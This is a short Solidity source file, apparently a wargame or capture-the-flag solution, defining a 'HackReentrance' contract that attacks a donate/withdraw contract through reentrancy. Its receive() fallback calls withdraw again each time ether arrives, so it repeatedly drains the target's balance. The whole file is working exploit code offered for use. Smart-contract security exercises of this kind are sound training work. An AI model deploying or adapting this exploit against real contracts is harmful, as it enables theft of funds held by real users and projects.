// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) view external returns (uint balance);
}

contract HackReentrance {
  
  function donate(address payable _to) public payable {
    IReentrance(_to).donate{value: msg.value}(address(this));
  }

  function hack(address payable _to, uint256 _amount) public payable {
    IReentrance(_to).withdraw(_amount);
  }

  receive() external payable {
    IReentrance(msg.sender).withdraw(msg.value);
  }
}